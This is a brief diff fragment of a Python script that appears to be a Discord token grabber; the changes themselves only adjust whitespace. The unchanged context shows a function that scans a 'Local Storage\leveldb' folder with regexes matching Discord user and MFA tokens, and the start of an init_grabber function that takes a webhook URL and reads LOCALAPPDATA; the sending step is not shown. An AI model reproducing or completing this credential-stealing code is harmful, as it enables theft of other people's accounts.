@@ -5,9 +5,6 @@ import json
 from urllib.request import Request, urlopen
 
 
-
-
-
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
@@ -21,6 +18,7 @@ def find_tokens(path):
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                 tokens.extend(iter(re.findall(regex, line)))
     return tokens
+
 
 def init_grabber(WEBHOOK_URL):
     local = os.getenv('LOCALAPPDATA')
